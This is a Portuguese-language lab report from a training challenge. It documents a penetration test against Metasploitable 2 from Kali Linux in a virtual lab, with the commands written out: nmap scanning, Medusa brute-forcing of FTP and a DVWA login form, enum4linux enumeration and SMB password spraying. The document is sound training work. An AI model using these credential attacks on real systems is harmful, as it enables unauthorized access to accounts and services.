# Estudo de Caso (Desafio DIO)

## 1. INTRODUÇÃO

### 1.1 Host utilizado

**Relatório de detalhes do sistema**  
- Data do relatório: 2025-11-16 18:20:49  

#### Informações de hardware
- Modelo: Lenovo LOQ 15IAX9E  
- Memória: 16 GiB  
- Processador: 12th Gen Intel® Core™ i5-12450HX × 12  
- Gráficos: Intel UHD + NVIDIA GeForce RTX 3050 6GB  
- Disco: 512 GB  

#### Informações de software
- Firmware: Q8CN12WW  
- SO: Ubuntu 24.04.3 LTS (64 bits)  
- GNOME: versão 46  
- Kernel: Linux 6.14.0-35-generic  

---

## 2. ARQUITETURA DO TESTE

Foi utilizada a virtualização com o **Virtual Machine Manager 4.1.0 (libvirt/virt-manager)**.  
Uma imagem do **Kali Linux** e outra do **Metasploitable 2** foram instaladas nesse ambiente.

*(Figura 1 – Ambiente estruturado com QEMU)*

---

## 3. CONDUÇÃO DOS TESTES

### 3.1 Ferramenta: ping

Comando:
```bash
ping -c5 [ip host]
```

*(Figura 2 – Realizando o “ping” da máquina alvo)*

O comando tem por finalidade evidenciar a disponibilidade do alvo na rede.  
Após o “ping” a máquina alvo respondeu que estava ativa.

---

### 3.2 Ferramenta: nmap

Comando:
```bash
nmap -sV -p 21,22,80,443 [ip host]
```

*(Figura 3 – Explorando o alvo com o “nmap”)*

A ferramenta revelou diversos serviços/portas disponíveis (open) para exploração: **ssh, http, vnc, ftp**, entre outros.  
Uma tentativa de acesso indevido ao **ftp** foi negada ao inserir credenciais aleatórias.

*(Figura 4 – Serviço “ftp” habilitado e disponível)*  
*(Figura 5 – Tentativa de acesso negada com credenciais aleatórias)*

Para avançar, foram criadas listas de usuários e senhas:

```bash
echo -e "users\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

---

### 3.3 Ferramenta: medusa (FTP)

Comando:
```bash
medusa -h [ip host] -U users.txt -P pass.txt -M ftp -t 6
```

- `-h`: IP do host alvo  
- `-U`: lista de usuários  
- `-P`: lista de senhas  
- `-M`: serviço alvo (ftp)  
- `-t`: número de threads  

*(Figura 6 – Resultados obtidos com Medusa)*

O ataque evidenciou vulnerabilidade: credenciais válidas foram encontradas (**user: msfadmin / passwd: msfadmin**).  
Com isso, foi possível acessar o serviço FTP.

*(Figura 7 – Acesso ao “ftp” com sucesso)*

---

### 3.3.1 Ataque a formulários web

Parâmetros obtidos via Ferramenta de Desenvolvedor do navegador:  
- `username`  
- `password`  
- `Login`

Comando:
```bash
medusa -h [ip host] -U users.txt -P pass.txt -M http \
-m PAGE: '/dvwa/login.php' \
-m FORM: 'username^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```

*(Figura 8 – Obtenção dos parâmetros do servidor)*  
*(Figura 9 – Resultados do ataque ao formulário)*

---

### 3.3.2 Ataques em cadeia (Chain Attacks)

- **Ataques em cadeia**: exploram múltiplas vulnerabilidades em etapas sucessivas.  
- **Enumeração SMB**: identifica compartilhamentos, usuários e grupos via protocolo SMB.  
- **Password Spraying**: tenta uma senha comum em várias contas, reduzindo bloqueios.

---

### 3.4 Ferramenta: enum4linux

Comando:
```bash
enum4linux -a [ip host] | tee enum4_output.txt
```

Saída analisada → criação de lista de usuários:
```bash
echo -e "user\nmsfadmim\nservice" > smb_users.txt
```

Lista de senhas:
```bash
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```

---

### 3.4 Ferramenta: medusa (SMB)

Comando:
```bash
medusa -h [ip host] -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

- `-T 50`: escaneia até 50 hosts simultaneamente  

*(Figura 10 – Password spraying sobre SMB)*  
*(Figura 11 – Sucesso no acesso via SMB)*

---

# ✅ Conclusão

Os testes demonstraram:
- Disponibilidade do alvo (ping).  
- Serviços expostos (nmap).  
- Vulnerabilidade de credenciais fracas (medusa).  
- Possibilidade de ataques mais elaborados (formulários web, SMB).  

O estudo evidenciou como credenciais simples podem comprometer sistemas e como ataques em cadeia ampliam o impacto da exploração.